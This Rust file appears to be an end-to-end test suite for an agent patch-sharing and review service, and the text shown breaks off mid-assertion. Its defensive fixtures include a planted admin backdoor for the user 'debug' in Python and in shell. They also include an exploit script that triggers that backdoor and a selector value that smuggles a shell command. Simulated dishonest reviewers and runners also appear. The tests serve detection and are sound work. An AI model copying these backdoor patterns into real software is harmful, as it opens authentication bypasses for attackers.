//! End-to-end: drives a running Worker the way agents would.
//!
//!   npx wrangler d1 migrations apply collective --local
//!   npx wrangler dev                        # with ADMIN_TOKEN in .dev.vars
//!   COLLECTIVE_URL=http://localhost:8787 COLLECTIVE_ADMIN_TOKEN=dev-admin \
//!     cargo test -p collective-e2e -- --ignored --test-threads=1
//!
//! The review queue is global, so run against fresh local state, one test
//! at a time.

#[path = "../../core/tests/common.rs"]
mod common;

use collective_core::diff::parse_diff;
use collective_core::hash::sha256_hex;
use collective_core::work::{solve_work, REPORT_BITS};
use common::{lines, Repo};
use serde_json::{json, Value};

const MARKER: &str = "if user == \"debug\": grant_admin()";

struct Api {
    base: String,
    admin: String,
}

impl Api {
    fn new() -> Api {
        Api {
            base: std::env::var("COLLECTIVE_URL")
                .unwrap_or_else(|_| "http://localhost:8787".into()),
            admin: std::env::var("COLLECTIVE_ADMIN_TOKEN").unwrap_or_else(|_| "dev-admin".into()),
        }
    }

    fn call(
        &self,
        method: &str,
        path: &str,
        token: Option<&str>,
        body: Option<Value>,
    ) -> (u16, Value) {
        let mut req = ureq::request(method, &format!("{}{}", self.base, path));
        if let Some(t) = token {
            req = req.set("authorization", &format!("Bearer {t}"));
        }
        if path.starts_with("/v1/admin") {
            req = req.set("x-admin-token", &self.admin);
        }
        let res = match body {
            Some(b) => req.send_json(b),
            None => req.call(),
        };
        let resp = match res {
            Ok(r) => r,
            Err(ureq::Error::Status(_, r)) => r,
            Err(e) => panic!("{method} {path}: {e}"),
        };
        let status = resp.status();
        let text = resp.into_string().unwrap();
        (
            status,
            serde_json::from_str(&text).unwrap_or(Value::String(text)),
        )
    }

    fn put_bytes(&self, path: &str, bytes: &[u8]) -> (u16, Value) {
        let res = ureq::put(&format!("{}{}", self.base, path))
            .set("x-admin-token", &self.admin)
            .send_bytes(bytes);
        let resp = match res {
            Ok(r) => r,
            Err(ureq::Error::Status(_, r)) => r,
            Err(e) => panic!("PUT {path}: {e}"),
        };
        let status = resp.status();
        (
            status,
            serde_json::from_str(&resp.into_string().unwrap()).unwrap_or(Value::Null),
        )
    }

    /// Files a stake-less report, paying with proof of work.
    fn report(&self, token: &str, patch: &str) -> String {
        let op = self.me(token)["operator_id"].as_str().unwrap().to_string();
        let commitment = sha256_hex(format!("evidence for {patch}"));
        let nonce = solve_work(&format!("{op}:{patch}:{commitment}"), REPORT_BITS);
        let (s, v) = self.call(
            "POST",
            &format!("/v1/patches/{patch}/challenges"),
            Some(token),
            Some(json!({ "severity": "high", "evidence_commitment": commitment, "work_nonce": nonce })),
        );
        assert_eq!(s, 201, "{v}");
        v["id"].as_str().unwrap().to_string()
    }

    fn register(&self, operator: &str) -> String {
        let (s, v) = self.call(
            "POST",
            "/v1/register",
            None,
            Some(json!({ "operator": operator, "agent_name": "bot" })),
        );
        assert_eq!(s, 201, "{v}");
        v["token"].as_str().unwrap().to_string()
    }

    /// Grants an operator genesis influence, which gives it standing: its
    /// patches' review tasks open at once (REVIEWS.md, Newcomers).
    fn genesis(&self, operator: &str) {
        let (s, v) = self.call(
            "POST",
            "/v1/admin/genesis",
            None,
            Some(json!({ "operator": operator, "amount": 100 })),
        );
        assert_eq!(s, 200, "{v}");
    }

    fn me(&self, token: &str) -> Value {
        self.call("GET", "/v1/me", Some(token), None).1
    }

    /// Reviews every task offered until none are left. Honest reviewers
    /// report the marker line wherever they see it; lazy ones say "clean".
    fn drain_reviews(&self, token: &str, honest: bool) -> usize {
        let mut done = 0;
        for _ in 0..100 {
            let (s, v) = self.call("POST", "/v1/reviews/next", Some(token), None);
            assert_eq!(s, 200, "{v}");
            let Some(task) = v["task"].as_object() else {
                break;
            };
            let shard = task["task_id"].as_str().unwrap();
            let issues = if honest {
                marker_issues(task["diff"].as_str().unwrap())
            } else {
                vec![]
            };
            let (s, v) = self.call(
                "POST",
                &format!("/v1/reviews/{shard}"),
                Some(token),
                Some(json!({ "issues": issues })),
            );
            assert_eq!(s, 200, "{v}");
            done += 1;
        }
        done
    }
}

/// New-side line numbers of the marker in a diff, as review issues.
fn marker_issues(diff: &str) -> Vec<Value> {
    let mut out = vec![];
    for f in parse_diff(diff).unwrap() {
        for h in &f.hunks {
            let mut line = h.new_start;
            for l in &h.lines {
                match l.as_bytes()[0] {
                    b'+' => {
                        if l.contains(MARKER) {
                            out.push(json!({ "path": f.path(), "start": line, "end": line, "kind": "backdoor", "severity": "critical", "note": "grants admin to a magic user name" }));
                        }
                        line += 1;
                    }
                    b' ' => line += 1,
                    _ => {}
                }
            }
        }
    }
    out
}

fn ledger_has(me: &Value, reason: &str) -> bool {
    me["recent"]
        .as_array()
        .unwrap()
        .iter()
        .any(|e| e["reason"] == reason)
}

#[test]
#[ignore = "needs a running Worker; see module docs"]
fn agents_review_challenge_ban_and_converge() {
    let api = Api::new();
    let run = format!(
        "{:x}",
        std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap()
            .as_millis()
    );
    let upstream = format!("https://github.com/e2e/widget-{run}");
    let project_path = upstream.replace("https://", "").replace('/', "%2F");

    let src = lines(40, "x");
    let repo = Repo::new(&[("app.py", &src), ("lib.py", &lines(40, "y"))]);
    let base = repo.base.clone();

    let (s, _) = api.call(
        "POST",
        "/v1/admin/pool",
        None,
        Some(json!({ "amount": 1000 })),
    );
    assert_eq!(s, 200);
    let alice = api.register(&format!("alice-{run}")); // lazy reviewer
    let bob = api.register(&format!("bob-{run}")); // plants a backdoor
                                                   // Authors with standing, so their patches are reviewed at once (a
                                                   // newcomer's wait for standing or a vouch: newcomers_wait_for_standing_or_a_vouch).
    api.genesis(&format!("alice-{run}"));
    api.genesis(&format!("bob-{run}"));
    let carol = api.register(&format!("carol-{run}")); // honest
    let dave = api.register(&format!("dave-{run}")); // honest

    // Canaries: inert, known-bad patches that only appear as review tasks.
    for i in 0..2 {
        let canary_src = src.replace(
            &format!("x {}\n", 10 + i),
            &format!("x {}\n{MARKER}\n", 10 + i),
        );
        let diff = repo.diff(&[("app.py", Some(canary_src))]);
        let line = 10 + i as u32 + 1;
        let (s, v) = api.call(
            "POST",
            "/v1/admin/canaries",
            None,
            Some(json!({ "project": format!("{upstream}-decoy"), "base_commit": base, "intent": "Add a debug helper", "diff": diff,
                         "planted": [{ "path": "app.py", "start": line, "end": line }] })),
        );
        assert_eq!(s, 200, "{v}");
    }

    // Alice shares a useful patch; Bob shares one with a backdoor.
    let useful = repo.diff(&[(
        "lib.py",
        Some(lines(40, "y").replace(
            "y 20\n",
            "y 20\ndef to_json(rows):\n    return json.dumps(rows)\n",
        )),
    )]);
    let (s, v) = api.call(
        "POST",
        "/v1/patches",
        Some(&alice),
        Some(json!({ "project": upstream, "intent": "Add JSON output for list rows", "base_commit": base, "diff": useful })),
    );
    assert_eq!(s, 201, "{v}");
    let p1 = v["patch"]["id"].as_str().unwrap().to_string();
    assert!(v["review_task"].is_string(), "{v}");

    let evil = repo.diff(&[(
        "app.py",
        Some(src.replace(
            "x 5\n",
            &format!("x 5\ndef login(user):\n    {MARKER}\n    return check(user)\n"),
        )),
    )]);
    let (s, v) = api.call(
        "POST",
        "/v1/patches",
        Some(&bob),
        Some(json!({ "project": upstream, "intent": "Speed up login checks", "base_commit": base, "diff": evil })),
    );
    assert_eq!(s, 201, "{v}");
    let p_evil = v["patch"]["id"].as_str().unwrap().to_string();

    // Search before writing: a reworded query finds Alice's patch.
    let (_, v) = api.call(
        "POST",
        "/v1/search",
        None,
        Some(json!({ "project": upstream, "query": "list rows should print as JSON" })),
    );
    assert_eq!(v["intents"][0]["patches"][0]["id"], json!(p1));

    // Reviews: two honest reviewers independently report the backdoor.
    assert!(api.drain_reviews(&carol, true) >= 3);
    assert!(api.drain_reviews(&dave, true) >= 3);
    api.drain_reviews(&alice, false);

    let (_, v) = api.call("GET", &format!("/v1/patches/{p_evil}"), None, None);
    assert_eq!(v["patch"]["status"], "quarantined", "{v}");
    let (s, v) = api.call(
        "POST",
        &format!("/v1/patches/{p_evil}/adoptions"),
        Some(&carol),
        Some(json!({ "outcome": "applied" })),
    );
    assert_eq!(s, 409, "{v}");

    let carol_me = api.me(&carol);
    assert!(ledger_has(&carol_me, "caught a canary"), "{carol_me}");
    assert_eq!(carol_me["canaries"]["detection_rate"], 1.0, "{carol_me}");
    let alice_me = api.me(&alice);
    assert!(ledger_has(&alice_me, "missed a canary"), "{alice_me}");
    assert_eq!(alice_me["canaries"]["detection_rate"], 0.0, "{alice_me}");
    assert!(alice_me["rep"].as_f64().unwrap() < 0.0);

    // Duty: Alice skimped on review, so she cannot submit again.
    let more = repo.diff(&[(
        "lib.py",
        Some(lines(40, "y").replace("y 30\n", "y 30\n# tidy\n")),
    )]);
    let (s, v) = api.call("POST", "/v1/patches", Some(&alice), Some(json!({ "project": upstream, "intent": "Tidy up the library module", "base_commit": base, "diff": more })));
    assert_eq!(s, 402, "{v}");

    // Honest reviewers adopt Alice's patch; it converges into the trunk.
    for t in [&carol, &dave] {
        let (s, v) = api.call(
            "POST",
            &format!("/v1/patches/{p1}/adoptions"),
            Some(t),
            Some(json!({ "outcome": "shipped" })),
        );
        assert_eq!(s, 201, "{v}");
    }
    let (s, v) = api.call(
        "POST",
        &format!("/v1/projects/{project_path}/trunks/{base}/converge"),
        Some(&carol),
        None,
    );
    assert_eq!(s, 200, "{v}");
    assert_eq!(v["patch_ids"], json!([p1]), "{v}");
    let (_, trunk) = api.call(
        "GET",
        &format!("/v1/projects/{project_path}/trunks/{base}/diff"),
        None,
        None,
    );
    assert!(repo.applies(trunk.as_str().unwrap()));

    // The backdoor is proven: Bob's operator is banned and its keys stop working.
    let (_, v) = api.call("GET", &format!("/v1/patches/{p_evil}"), None, None);
    assert_eq!(v["patch"]["status"], "quarantined");
    let challenge_id = find_challenge(&api, &carol, &p_evil);
    let (s, v) = api.call(
        "POST",
        &format!("/v1/admin/challenges/{challenge_id}/resolve"),
        None,
        Some(json!({ "verdict": "problem", "via": "proof", "severity": "critical", "intent": "malicious" })),
    );
    assert_eq!(s, 200, "{v}");
    assert_eq!(v["settlement"]["bans"].as_array().unwrap().len(), 1);
    let (s, _) = api.call("GET", "/v1/me", Some(&bob), None);
    assert_eq!(s, 401);
    assert!(ledger_has(&api.me(&dave), "found a confirmed problem"));
    // Carol reported first, so she is the finder; the bounty is paid even
    // though nobody had adopted the patch yet (capped by the pool's funds).
    assert!(v["settlement"]["bounty"].as_f64().unwrap() > 0.0, "{v}");
    assert!(
        ledger_has(&api.me(&carol), "bounty: critical problem found"),
        "{v}"
    );

    // A bonded flag quarantines at once; a wrong one costs the bond.
    let commitment = sha256_hex("evidence:salt");
    let (s, v) = api.call(
        "POST",
        &format!("/v1/patches/{p1}/challenges"),
        Some(&carol),
        Some(json!({ "severity": "high", "evidence_commitment": commitment, "bond": 10 })),
    );
    assert_eq!(s, 201, "{v}");
    assert_eq!(v["quarantined"], true);
    let flag_id = v["id"].as_str().unwrap().to_string();
    let before = api.me(&carol)["rep"].as_f64().unwrap();
    let (s, _) = api.call(
        "POST",
        &format!("/v1/admin/challenges/{flag_id}/resolve"),
        None,
        Some(json!({ "verdict": "clean", "via": "jury", "severity": "high", "intent": "unknown" })),
    );
    assert_eq!(s, 200);
    // Unchanged apart from a few seconds of decay (180-day half-life).
    let after = api.me(&carol)["rep"].as_f64().unwrap();
    assert!((after - before).abs() < 0.01, "{before} -> {after}");
    let (_, v) = api.call("GET", &format!("/v1/patches/{p1}"), None, None);
    assert_eq!(v["patch"]["status"], "open");

    // A report without a bond needs proof of work and does not quarantine.
    let dave_id = api.me(&dave)["operator_id"].as_str().unwrap().to_string();
    let (s, _) = api.call(
        "POST",
        &format!("/v1/patches/{p1}/challenges"),
        Some(&dave),
        Some(json!({ "severity": "low", "evidence_commitment": commitment })),
    );
    assert_eq!(s, 402);
    let nonce = solve_work(&format!("{dave_id}:{p1}:{commitment}"), REPORT_BITS);
    let (s, v) = api.call(
        "POST",
        &format!("/v1/patches/{p1}/challenges"),
        Some(&dave),
        Some(json!({ "severity": "low", "evidence_commitment": commitment, "work_nonce": nonce })),
    );
    assert_eq!(s, 201, "{v}");
    assert_eq!(v["quarantined"], false);

    // MCP exposes the same operations.
    let (_, v) = api.call(
        "POST",
        "/mcp",
        None,
        Some(json!({ "jsonrpc": "2.0", "id": 1, "method": "tools/list" })),
    );
    let names: Vec<&str> = v["result"]["tools"]
        .as_array()
        .unwrap()
        .iter()
        .map(|t| t["name"].as_str().unwrap())
        .collect();
    assert!(names.contains(&"collective_review_next") && names.contains(&"collective_flag"));
    let (_, v) = api.call(
        "POST",
        "/mcp",
        Some(&carol),
        Some(json!({ "jsonrpc": "2.0", "id": 2, "method": "tools/call", "params": { "name": "collective_standing", "arguments": {} } })),
    );
    assert!(
        v["result"]["structuredContent"]["rep"].as_f64().unwrap() > 0.0,
        "{v}"
    );
}

/// The challenge raised by review quorum on a patch.
fn find_challenge(api: &Api, token: &str, patch_id: &str) -> String {
    let (_, v) = api.call(
        "GET",
        &format!("/v1/patches/{patch_id}/challenges"),
        Some(token),
        None,
    );
    v["challenges"][0]["id"]
        .as_str()
        .map(String::from)
        .unwrap_or_else(|| panic!("no challenge listed: {v}"))
}

/// A synthetic sandbox report for a proof job, as `collective prove` would
/// submit it: every run of each tree passes or fails as given.
fn proof_report(spec: &Value, base_passes: bool, patched_passes: bool) -> Value {
    let repeats = spec["repeats"].as_u64().unwrap();
    let runs: Vec<Value> = [("base", base_passes), ("patched", patched_passes)]
        .iter()
        .flat_map(|(tree, ok)| {
            (0..repeats).map(move |i| {
                json!({ "tree": tree, "attempt": i, "status": if *ok { "passed" } else { "failed" },
                "exit_code": if *ok { 0 } else { 1 }, "duration_ms": 5, "output_tail": "", "tests_run": null })
            })
        })
        .collect();
    json!({ "prover_version": "e2e", "setup": { "ok": true, "error": null, "network_isolated": true, "isolation": "network namespace" },
            "runs": runs, "cpu_ms": 1000 })
}

/// Proofs are run by participants: a job settles only when enough
/// independent, trusted runners agree, and nobody with a stake in it may
/// run it. Runs no sandbox: the reports are synthetic (the sandbox itself
/// is tested in crates/prover).
#[test]
#[ignore = "needs a running Worker; see module docs"]
fn proofs_settle_by_a_quorum_of_runners() {
    let api = Api::new();
    let run = format!(
        "p{:x}",
        std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap()
            .as_millis()
    );
    let upstream = format!("https://github.com/e2e/proofs-{run}");
    let project_path = upstream.replace("https://", "").replace('/', "%2F");

    let add = "#!/bin/sh\necho $(($1 + $2))\n";
    let test =
        "#!/bin/sh\n[ \"$(sh add.sh 2 3)\" = 5 ] || { echo add is broken; exit 1; }\necho ok\n";
    let login = "#!/bin/sh\n[ \"$1\" = alice ] && echo user && exit 0\necho denied; exit 1\n";
    let repo = Repo::new(&[("add.sh", add), ("test.sh", test), ("login.sh", login)]);
    let base = repo.base.clone();

    let bob = api.register(&format!("bob-{run}"));
    let eve = api.register(&format!("eve-{run}"));
    let carol = api.register(&format!("carol-{run}"));
    // Three runners with standing (founders, here), and three newcomers.
    let trusted: Vec<String> = (0..3)
        .map(|i| {
            let name = format!("runner{i}-{run}");
            let token = api.register(&name);
            let (s, v) = api.call(
                "POST",
                "/v1/admin/genesis",
                None,
                Some(json!({ "operator": name, "amount": 100 })),
            );
            assert_eq!(s, 200, "{v}");
            token
        })
        .collect();
    let newcomers: Vec<String> = (0..3)
        .map(|i| api.register(&format!("newcomer{i}-{run}")))
        .collect();

    // Bob breaks addition; Eve slips a backdoor into login.
    let breaking = repo.diff(&[("add.sh", Some("#!/bin/sh\necho $(($1 + $2 + 1))\n".into()))]);
    let (s, v) = api.call("POST", "/v1/patches", Some(&bob), Some(json!({ "project": upstream, "intent": "Make addition faster", "base_commit": base, "diff": breaking })));
    assert_eq!(s, 201, "{v}");
    let p_break = v["patch"]["id"].as_str().unwrap().to_string();
    let backdoor = repo.diff(&[(
        "login.sh",
        Some(login.replace(
            "[ \"$1\" = alice ]",
            "[ \"$1\" = debug ] && echo admin && exit 0\n[ \"$1\" = alice ]",
        )),
    )]);
    let (s, v) = api.call("POST", "/v1/patches", Some(&eve), Some(json!({ "project": upstream, "intent": "Tidy up login handling", "base_commit": base, "diff": backdoor })));
    assert_eq!(s, 201, "{v}");
    let p_backdoor = v["patch"]["id"].as_str().unwrap().to_string();

    // The upstream source at the base commit (fetched from GitHub in production).
    let tgz = std::process::Command::new("git")
        .args(["archive", "--format=tar.gz", "--prefix=src/", "HEAD"])
        .current_dir(&repo.dir)
        .output()
        .unwrap()
        .stdout;
    let (s, v) = api.put_bytes(&format!("/v1/admin/sources/{project_path}/{base}"), &tgz);
    assert_eq!(s, 200, "{v}");

    let next =
        |token: &str| api.call("POST", "/v1/proofs/next", Some(token), None).1["job"].clone();
    // Claims the open job, fetches what a runner needs, and reports runs
    // that pass or fail as given. Returns the run id and the server's answer.
    let run_job = |token: &str, base_passes: bool, patched_passes: bool| -> (String, Value) {
        let job = next(token);
        assert!(!job.is_null(), "no job offered");
        assert_eq!(job["base_commit"], json!(base), "{job}");
        let id = job["run_id"].as_str().unwrap().to_string();
        // The same job comes back until it is reported.
        assert_eq!(next(token)["run_id"], json!(id));
        let (s, _) = api.call("GET", job["source"].as_str().unwrap(), Some(token), None);
        assert_eq!(s, 200, "a runner can fetch the source of a job it holds");
        let (s, v) = api.call(
            "POST",
            &format!("/v1/proof-runs/{id}/report"),
            Some(token),
            Some(json!({ "report": proof_report(&job["spec"], base_passes, patched_passes) })),
        );
        assert_eq!(s, 200, "{v}");
        (id, v)
    };

    // A contributed canary is verified by runners before it counts.
    let maker = api.register(&format!("maker-{run}"));
    let contribute = |diff: String| {
        let (s, v) = api.call("POST", "/v1/canaries", Some(&maker), Some(json!({
            "project": upstream, "base_commit": base, "intent": format!("Simplify addition ({run})"),
            "diff": diff, "planted": [{ "path": "add.sh", "start": 2, "end": 2 }], "tests": ["test.sh"] })));
        assert_eq!(s, 202, "{v}");
        v["id"].as_str().unwrap().to_string()
    };
    let canary = |id: &str| -> Value {
        let (_, v) = api.call("GET", "/v1/canaries/mine", Some(&maker), None);
        v["contributions"]
            .as_array()
            .unwrap()
            .iter()
            .find(|c| c["id"] == json!(id))
            .cloned()
            .unwrap()
    };
    let good = contribute(repo.diff(&[("add.sh", Some("#!/bin/sh\necho $(($1 - $2))\n".into()))]));
    assert!(
        next(&maker).is_null(),
        "a contributor can't verify its own canary"
    );

    // New accounts alone settle nothing, however many agree.
    for n in &newcomers {
        let (_, v) = run_job(n, true, false);
        assert_eq!(v["verdict"], "proven", "{v}");
        assert!(v["settled"].is_null(), "{v}");
    }
    assert_eq!(canary(&good)["state"], "verifying");
    // A report is taken once, and only from the runner that holds the run.
    let (id, v) = run_job(&trusted[0], true, false);
    assert!(
        v["settled"].is_null(),
        "one trusted runner is not a quorum: {v}"
    );
    let again = Some(json!({ "report": proof_report(&json!({ "repeats": 2 }), true, false) }));
    let (s, _) = api.call(
        "POST",
        &format!("/v1/proof-runs/{id}/report"),
        Some(&trusted[0]),
        again.clone(),
    );
    assert_eq!(s, 409);
    let (s, _) = api.call(
        "POST",
        &format!("/v1/proof-runs/{id}/report"),
        Some(&trusted[1]),
        again,
    );
    assert_eq!(s, 403);
    // Enough trust behind one verdict settles it.
    let (_, v) = run_job(&trusted[1], true, false);
    assert_eq!(v["settled"], "proven", "{v}");
    let c = canary(&good);
    assert_eq!(c["state"], "live", "{c}");
    assert_eq!(c["credited_units"], 3.0, "{c}");
    assert_eq!(api.me(&maker)["duty"]["credited"], 3);
    assert!(ledger_has(&api.me(&trusted[1]), "ran a proof"));
    assert!(ledger_has(&api.me(&newcomers[0]), "ran a proof"));
    assert!(
        next(&trusted[2]).is_null(),
        "a settled job is no longer offered"
    );

    // A canary its own tests don't catch costs its contributor.
    let bad = contribute(repo.diff(&[("add.sh", Some(format!("{add}# nothing breaks\n")))]));
    for t in &trusted {
        run_job(t, true, true);
    }
    let c = canary(&bad);
    assert_eq!(c["state"], "failed", "{c}");
    assert!(ledger_has(
        &api.me(&maker),
        "contributed a canary that failed verification"
    ));

    // A regression proof with the project's own test resolves the challenge.
    let c1 = api.report(&carol, &p_break);
    let (s, v) = api.call(
        "POST",
        &format!("/v1/challenges/{c1}/proofs"),
        Some(&carol),
        Some(json!({ "kind": "regression", "tests": ["test.sh; true"] })),
    );
    assert_eq!(s, 400, "selectors cannot smuggle shell: {v}");
    let (s, v) = api.call(
        "POST",
        &format!("/v1/challenges/{c1}/proofs"),
        Some(&bob),
        Some(json!({ "kind": "regression", "tests": ["test.sh"] })),
    );
    assert_eq!(s, 403, "only backers may prove: {v}");
    let (s, v) = api.call(
        "POST",
        &format!("/v1/challenges/{c1}/proofs"),
        Some(&carol),
        Some(json!({ "kind": "regression", "tests": ["test.sh"], "repeats": 2 })),
    );
    assert_eq!(s, 202, "{v}");
    let proof_id = v["id"].as_str().unwrap().to_string();
    // Neither the finder nor the patch's author may run it.
    assert!(next(&carol).is_null(), "the finder can't run its own proof");
    assert!(
        next(&bob).is_null(),
        "the author can't run a proof of its patch"
    );
    // Two trusted runners agree, one dissents: not settled until a third
    // operator agrees. The dissenter then pays for it.
    run_job(&trusted[0], true, false);
    let (_, v) = run_job(&trusted[2], true, true);
    assert_eq!(v["verdict"], "not_reproduced", "{v}");
    let (_, v) = run_job(&trusted[1], true, false);
    assert!(v["settled"].is_null(), "{v}");
    let (_, v) = run_job(&newcomers[0], true, false);
    assert_eq!(v["settled"], "proven", "{v}");
    assert!(ledger_has(
        &api.me(&trusted[2]),
        "proof run disagreed with the other runners"
    ));
    let (_, proof) = api.call("GET", &format!("/v1/proofs/{proof_id}"), None, None);
    assert_eq!(proof["status"], "done", "{proof}");
    assert_eq!(proof["verdict"], "proven", "{proof}");
    assert_eq!(proof["runs"].as_array().unwrap().len(), 4, "{proof}");
    assert!(proof["report"]["setup"]["network_isolated"]
        .as_bool()
        .unwrap());
    let (_, c) = api.call("GET", &format!("/v1/challenges/{c1}"), None, None);
    assert_eq!(c["resolution"]["via"], "proof", "{c}");
    assert_eq!(c["resolution"]["verdict"], "problem");
    let (_, p) = api.call("GET", &format!("/v1/patches/{p_break}"), None, None);
    assert_eq!(p["patch"]["status"], "rejected");

    // An exploit proof is verified evidence, but a person still judges it.
    let c2 = api.report(&carol, &p_backdoor);
    let (s, v) = api.call(
        "POST",
        &format!("/v1/challenges/{c2}/proofs"),
        Some(&carol),
        Some(json!({ "kind": "exploit", "command": "sh proof/exploit.sh", "repeats": 2,
                     "files": [{ "path": "proof/exploit.sh", "content": "sh login.sh debug | grep -qx admin" }] })),
    );
    assert_eq!(s, 202, "{v}");
    for t in &trusted {
        run_job(t, false, true);
    }
    let (_, c) = api.call("GET", &format!("/v1/challenges/{c2}"), None, None);
    assert_eq!(c["phase"], "staking", "{c}");
    assert_eq!(c["proofs"][0]["verdict"], "demonstrated");

    // Withdrawn patches leave the review queue.
    let (s, _) = api.call(
        "POST",
        &format!("/v1/patches/{p_backdoor}/withdraw"),
        Some(&eve),
        None,
    );
    assert_eq!(s, 200);
}

/// A synthetic sandbox report, as `collective run` would submit it.
fn suite_report(base_passes: bool, patched_passes: bool, cpu_ms: u64) -> Value {
    let run = |tree: &str, ok: bool| {
        json!({ "tree": tree, "attempt": 0, "status": if ok { "passed" } else { "failed" },
        "exit_code": if ok { 0 } else { 1 }, "duration_ms": 5, "output_tail": "", "tests_run": null })
    };
    json!({ "prover_version": "e2e", "setup": { "ok": true, "error": null, "network_isolated": true, "isolation": "network namespace" },
            "runs": [run("base", base_passes), run("patched", patched_passes)], "cpu_ms": cpu_ms })
}

/// Review-then-run tasks: whole patches, a size cap, review before run,
/// and runs checked against each other. Runs no sandbox: the reports are
/// synthetic (the sandbox itself is tested in crates/prover).
#[test]
#[ignore = "needs a running Worker; see module docs"]
fn review_then_run_tasks() {
    let api = Api::new();
    let run = format!(
        "r{:x}",
        std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap()
            .as_millis()
    );
    let upstream = format!("https://github.com/e2e/runs-{run}");
    let project_path = upstream.replace("https://", "").replace('/', "%2F");
    let add = "#!/bin/sh\necho $(($1 + $2))\n";
    let test = "#!/bin/sh\n[ \"$(sh add.sh 2 3)\" = 5 ] || exit 1\n";
    let repo = Repo::new(&[
        ("add.sh", add),
        ("test.sh", test),
        ("big.txt", &lines(3000, "x")),
    ]);
    let base = repo.base.clone();
    let (s, _) = api.call(
        "POST",
        "/v1/admin/pool",
        None,
        Some(json!({ "amount": 1000 })),
    );
    assert_eq!(s, 200);

    let author = api.register(&format!("author-{run}"));
    // Standing, so the patch's task opens at once for the runners below.
    api.genesis(&format!("author-{run}"));
    // Over the cap: one task must stay one sitting.
    let mut big = lines(3000, "x");
    for i in (1..3000).step_by(2) {
        big = big.replace(&format!("x {i}\n"), &format!("y {i}\n"));
    }
    let (s, v) = api.call("POST", "/v1/patches", Some(&author), Some(json!({ "project": upstream, "intent": "Rewrite the big file", "base_commit": base, "diff": repo.diff(&[("big.txt", Some(big))]) })));
    assert_eq!(s, 413, "{v}");
    assert!(v["error"].as_str().unwrap().contains("at most 2000"), "{v}");

    let intent = format!("Make addition faster ({run})");
    let breaking = repo.diff(&[("add.sh", Some("#!/bin/sh\necho $(($1 + $2 + 1))\n".into()))]);
    let (s, v) = api.call(
        "POST",
        "/v1/patches",
        Some(&author),
        Some(
            json!({ "project": upstream, "intent": intent, "base_commit": base, "diff": breaking }),
        ),
    );
    assert_eq!(s, 201, "{v}");
    let patch = v["patch"]["id"].as_str().unwrap().to_string();
    let task_id = v["review_task"].as_str().unwrap().to_string();

    // The project's suite, and its source (fetched from GitHub in production).
    let (s, v) = api.call(
        "PUT",
        &format!("/v1/admin/projects/{project_path}/run"),
        None,
        Some(
            json!({ "ecosystem": "none", "tests": ["test.sh"], "repeats": 1, "timeout_secs": 60 }),
        ),
    );
    assert_eq!(s, 200, "{v}");
    let (s, v) = api.call(
        "PUT",
        &format!("/v1/admin/projects/{project_path}/run"),
        None,
        Some(json!({ "ecosystem": "cargo", "tests": ["only_this"] })),
    );
    assert_eq!(s, 400, "a suite runs the whole suite: {v}");
    let tgz = std::process::Command::new("git")
        .args(["archive", "--format=tar.gz", "--prefix=src/", "HEAD"])
        .current_dir(&repo.dir)
        .output()
        .unwrap()
        .stdout;
    let (s, v) = api.put_bytes(&format!("/v1/admin/sources/{project_path}/{base}"), &tgz);
    assert_eq!(s, 200, "{v}");

    // Leases tasks until it gets this test's patch, reviewing others clean.
    let lease_ours = |token: &str| -> Value {
        for _ in 0..50 {
            let (s, v) = api.call("POST", "/v1/reviews/next", Some(token), None);
            assert_eq!(s, 200, "{v}");
            let task = v["task"].clone();
            assert!(!task.is_null(), "ran out of tasks before reaching ours");
            if task["intent"] == json!(intent) {
                return task;
            }
            let id = task["task_id"].as_str().unwrap();
            let (s, v) = api.call(
                "POST",
                &format!("/v1/reviews/{id}"),
                Some(token),
                Some(json!({ "issues": marker_issues(task["diff"].as_str().unwrap()) })),
            );
            assert_eq!(s, 200, "{v}");
            if v["next"]["phase"] == "run" {
                // Another runnable task: finish it so the next lease is new.
                let (s, v) = api.call(
                    "POST",
                    &format!("/v1/reviews/{id}/run"),
                    Some(token),
                    Some(json!({ "report": suite_report(true, true, 60_000) })),
                );
                assert_eq!(s, 200, "{v}");
            }
        }
        panic!("never got the task");
    };

    let runners: Vec<String> = (0..3)
        .map(|i| api.register(&format!("runner{i}-{run}")))
        .collect();
    let mut tasks = Vec::new();
    for r in &runners {
        let task = lease_ours(r);
        assert_eq!(task["task_id"], json!(task_id));
        assert_eq!(task["phase"], "review");
        assert_eq!(task["run"]["kind"], "suite", "{task}");
        assert!(task["diff"].as_str().unwrap().contains("add.sh"));
        // Running before reviewing is refused, and so is fetching the code to run.
        let (s, v) = api.call(
            "POST",
            &format!("/v1/reviews/{task_id}/run"),
            Some(r),
            Some(json!({ "report": suite_report(true, true, 1000) })),
        );
        assert_eq!(s, 409, "{v}");
        let (s, _) = api.call(
            "GET",
            &format!("/v1/reviews/{task_id}/source"),
            Some(r),
            None,
        );
        assert_eq!(s, 403);
        tasks.push(task);
    }

    // Each reviews, then runs. Two runs show the regression; one claims a pass.
    for (i, r) in runners.iter().enumerate() {
        let (s, v) = api.call(
            "POST",
            &format!("/v1/reviews/{task_id}"),
            Some(r),
            Some(json!({ "issues": [] })),
        );
        assert_eq!(s, 200, "{v}");
        assert_eq!(v["next"]["phase"], "run", "{v}");
        let (_, v) = api.call("POST", "/v1/reviews/next", Some(r), None);
        assert_eq!(
            v["task"]["phase"], "run",
            "the held task comes back for its run: {v}"
        );
        let (s, src) = api.call(
            "GET",
            &format!("/v1/reviews/{task_id}/source"),
            Some(r),
            None,
        );
        assert_eq!(s, 200, "{src}");
        let honest = i < 2;
        // Sandbox CPU: 5 and 25 minutes, and one runner inflating its figure.
        let cpu = [5, 25, 900][i] * 60_000;
        let (s, v) = api.call(
            "POST",
            &format!("/v1/reviews/{task_id}/run"),
            Some(r),
            Some(json!({ "report": suite_report(true, !honest, cpu) })),
        );
        assert_eq!(s, 200, "{v}");
        assert_eq!(v["outcome"], if honest { "regressed" } else { "passed" });
        assert_eq!(v["credited"], true, "{v}");
        let (s, _) = api.call(
            "POST",
            &format!("/v1/reviews/{task_id}/run"),
            Some(r),
            Some(json!({ "report": suite_report(true, true, 1000) })),
        );
        assert_eq!(s, 409, "a run is submitted once");
    }
    // The majority's regression challenges and quarantines the patch, and
    // the runner who contradicted it loses rep.
    let (_, v) = api.call("GET", &format!("/v1/patches/{patch}"), None, None);
    assert_eq!(v["patch"]["status"], "quarantined", "{v}");
    assert!(ledger_has(
        &api.me(&runners[2]),
        "run disagreed with the other runners"
